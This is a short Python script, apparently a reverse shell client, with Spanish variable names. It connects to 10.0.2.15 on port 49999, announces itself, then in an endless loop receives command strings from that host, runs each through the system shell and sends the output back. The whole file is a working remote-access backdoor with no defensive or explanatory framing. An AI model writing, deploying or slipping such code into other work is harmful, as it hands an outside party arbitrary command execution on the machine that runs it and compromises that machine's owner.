#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess

cliente = socket.socket()

try:
    cliente.connect(('10.0.2.15',49999))
    cliente.send("1".encode('utf-8'))

    while True:
        c = cliente.recv(1024).decode('utf-8')
        comando = subprocess.Popen(c,shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
except Exception as e:
    print(e)

